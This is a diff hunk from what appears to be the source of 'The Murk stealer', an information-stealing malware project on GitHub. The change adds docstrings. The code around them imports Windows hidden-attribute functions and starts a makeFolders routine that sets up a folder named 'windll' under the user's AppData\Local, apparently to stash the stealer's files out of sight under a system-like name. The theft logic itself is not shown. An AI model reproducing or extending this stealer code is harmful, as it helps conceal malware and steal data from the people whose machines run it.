@@ -9,10 +9,17 @@
 #                      https://github.com/Nick-Vinesmoke                      #
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
+"""
+All imports
+"""
 import os
 from win32con import FILE_ATTRIBUTE_HIDDEN
 from win32api import SetFileAttributes
 
+
+"""
+Makes all needed directories
+"""
 def makeFolders():
     pathf = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
     if os.path.exists(rf'{pathf}\windll'):
